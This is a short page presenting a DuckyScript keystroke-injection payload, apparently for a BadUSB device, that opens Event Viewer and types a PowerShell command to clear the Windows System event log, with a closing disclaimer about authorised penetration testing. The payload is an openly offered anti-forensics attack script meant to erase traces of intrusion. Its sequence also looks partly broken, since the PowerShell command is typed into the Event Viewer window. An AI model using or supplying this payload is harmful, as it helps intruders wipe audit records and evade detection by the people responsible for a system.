# Clear Event Logs

Opens the Event Viewer and clears the system event logs using PowerShell.

```
DELAY 500
GUI r
DELAY 200
STRING eventvwr.msc
ENTER
DELAY 1000
STRING powershell -Command "Clear-EventLog -LogName System"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.